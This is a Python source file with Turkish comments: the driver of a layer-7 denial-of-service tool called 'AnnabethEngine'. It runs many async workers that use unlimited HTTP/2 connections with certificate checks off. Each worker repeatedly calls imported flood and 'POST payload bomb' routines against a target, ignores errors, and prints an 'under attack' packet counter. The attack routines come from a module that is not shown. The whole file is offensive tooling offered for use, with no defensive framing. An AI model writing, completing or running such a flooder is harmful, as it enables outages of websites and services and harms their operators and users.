import asyncio
import httpx
from network.layers import DestructionVectors
from colorama import Fore


class AnnabethEngine:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.total_packets = 0
        self.is_running = True

    async def _worker_loop(self):
        # Sınırsız bağlantı limiti ile sistemi zorluyoruz sevgilim
        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=10) as client:
            while self.is_running:
                try:
                    # Karma saldırı moduna geçiyoruz
                    l7_count = await DestructionVectors.layer7_multiplex_flood(client, self.target)
                    post_count = await DestructionVectors.post_payload_bomb(client, self.target)

                    self.total_packets += (l7_count + post_count)
                except asyncio.CancelledError:
                    break
                except:
                    pass
                await asyncio.sleep(0.001)  # Mikrosaniye düzeyinde gecikme

    async def report(self):
        while self.is_running:
            print(
                f"{Fore.RED}[!] DURUM: {Fore.WHITE}SALDIRILIYOR >> {Fore.MAGENTA}Aktif Thread: {self.threads} {Fore.WHITE}| {Fore.YELLOW}Toplam Gönderilen Paket: {Fore.GREEN}{self.total_packets}",
                end="\r")
            await asyncio.sleep(0.1)

    async def start(self):
        print(f"{Fore.RED}[*] CEHENNEM KAPILARI GENİŞÇE AÇILIYOR... {self.threads} THREAD AKTİF.")
        self.tasks = [asyncio.create_task(self._worker_loop()) for _ in range(self.threads)]
        self.tasks.append(asyncio.create_task(self.report()))
        try:
            await asyncio.gather(*self.tasks)
        except asyncio.CancelledError:
            pass